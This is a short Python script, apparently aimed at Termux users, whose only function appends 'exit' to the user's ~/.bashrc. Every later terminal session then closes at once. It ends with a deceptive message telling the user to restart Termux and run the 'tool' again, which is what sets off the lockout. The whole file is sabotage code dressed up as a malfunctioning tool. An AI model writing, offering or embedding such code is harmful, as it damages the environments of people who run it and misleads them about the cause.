#
#
#
#
import os
import subprocess
#
#
#
def cr4sh3r():
    os.system("echo 'exit' >> ~/.bashrc")
    os.system("exit")
    subprocess.run("exit", shell=True)
    print("If nothing is working , Try exiting the Termux session and run this tool again . . .")

cr4sh3r()
#
#
#